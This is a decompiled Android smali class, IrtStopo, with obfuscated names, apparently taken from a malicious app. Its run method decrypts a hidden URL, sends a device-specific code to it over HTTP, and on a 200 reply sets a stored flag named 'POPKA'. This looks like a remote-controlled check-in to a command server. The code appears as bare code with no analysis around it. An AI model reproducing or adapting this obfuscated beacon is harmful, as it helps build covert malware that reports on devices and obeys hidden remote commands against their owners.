.class public Lcom/rt/me/IrtStopo;
.super Ljava/lang/Object;
.source "IrtStopo.java"

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field final idea1:Lcom/rt/me/Starter;

.field ideaStrin:Lcom/rt/me/IrtStrFunc;


# direct methods
.method constructor <init>(Lcom/rt/me/Starter;)V
    .locals 1
    .param p1, "o"    # Lcom/rt/me/Starter;

    .prologue
    .line 10
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 8
    new-instance v0, Lcom/rt/me/IrtStrFunc;

    invoke-direct {v0}, Lcom/rt/me/IrtStrFunc;-><init>()V

    iput-object v0, p0, Lcom/rt/me/IrtStopo;->ideaStrin:Lcom/rt/me/IrtStrFunc;

    .line 11
    iput-object p1, p0, Lcom/rt/me/IrtStopo;->idea1:Lcom/rt/me/Starter;

    .line 12
    return-void
.end method


# virtual methods
.method public run()V
    .locals 5

    .prologue
    .line 16
    iget-object v3, p0, Lcom/rt/me/IrtStopo;->idea1:Lcom/rt/me/Starter;

    invoke-static {v3}, Lcom/rt/me/Starter;->getAppContext(Lcom/rt/me/Starter;)Landroid/content/Context;

    move-result-object v0

    .line 17
    .local v0, "context":Landroid/content/Context;
    new-instance v2, Lcom/rt/me/IrtProgs;

    invoke-direct {v2, v0}, Lcom/rt/me/IrtProgs;-><init>(Landroid/content/Context;)V

    .line 18
    .local v2, "utils":Lcom/rt/me/IrtProgs;
    new-instance v1, Ljava/lang/String;

    .line 19
    iget-object v3, p0, Lcom/rt/me/IrtStopo;->ideaStrin:Lcom/rt/me/IrtStrFunc;

    .line 20
    const-string v4, "25491d709eba5ece69ef5702b5d725df6c2c55a8a72a933bd1f75ab686b0f4b4"

    invoke-virtual {v3, v4}, Lcom/rt/me/IrtStrFunc;->irt_deroc(Ljava/lang/String;)[B

    move-result-object v3

    .line 18
    invoke-direct {v1, v3}, Ljava/lang/String;-><init>([B)V

    .line 24
    .local v1, "url":Ljava/lang/String;
    :try_start_0
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static {v2}, Lcom/rt/me/IrtProgs;->getMainStringCode(Lcom/rt/me/IrtProgs;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Lcom/rt/me/IrtProgs;->responseGet(Lcom/rt/me/IrtProgs;Ljava/lang/String;)Lorg/apache/http/HttpResponse;

    move-result-object v3

    .line 25
    invoke-interface {v3}, Lorg/apache/http/HttpResponse;->getStatusLine()Lorg/apache/http/StatusLine;

    move-result-object v3

    invoke-interface {v3}, Lorg/apache/http/StatusLine;->getStatusCode()I

    move-result v3

    const/16 v4, 0xc8

    .line 23
    if-ne v3, v4, :cond_0

    .line 26
    invoke-virtual {p0}, Lcom/rt/me/IrtStopo;->sdlsdkjvlskdjv()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 29
    :cond_0
    :goto_0
    return-void

    .line 27
    :catch_0
    move-exception v3

    goto :goto_0
.end method

.method public sdlsdkjvlskdjv()V
    .locals 2

    .prologue
    .line 32
    iget-object v0, p0, Lcom/rt/me/IrtStopo;->idea1:Lcom/rt/me/Starter;

    invoke-static {v0}, Lcom/rt/me/Starter;->getDBInstance(Lcom/rt/me/Starter;)Landroid/content/SharedPreferences;

    move-result-object v0

    const-string v1, "POPKA"

    invoke-static {v0, v1}, Lcom/rt/me/IrtProgs;->setBooleanPref(Landroid/content/SharedPreferences;Ljava/lang/String;)V

    .line 33
    return-void
.end method
